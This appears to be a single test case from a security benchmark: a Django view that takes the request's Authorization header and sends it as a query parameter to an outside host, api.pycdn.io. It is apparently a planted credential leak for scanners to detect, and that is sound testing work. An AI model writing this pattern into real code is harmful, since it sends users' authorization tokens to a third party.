# SPDX-License-Identifier: Apache-2.0
from django.http import JsonResponse
import requests


def BenchmarkTest10797(request):
    auth_header = request.META.get('HTTP_AUTHORIZATION', '')
    data = str(auth_header).replace('\x00', '')
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=True)
    return JsonResponse({"saved": True})
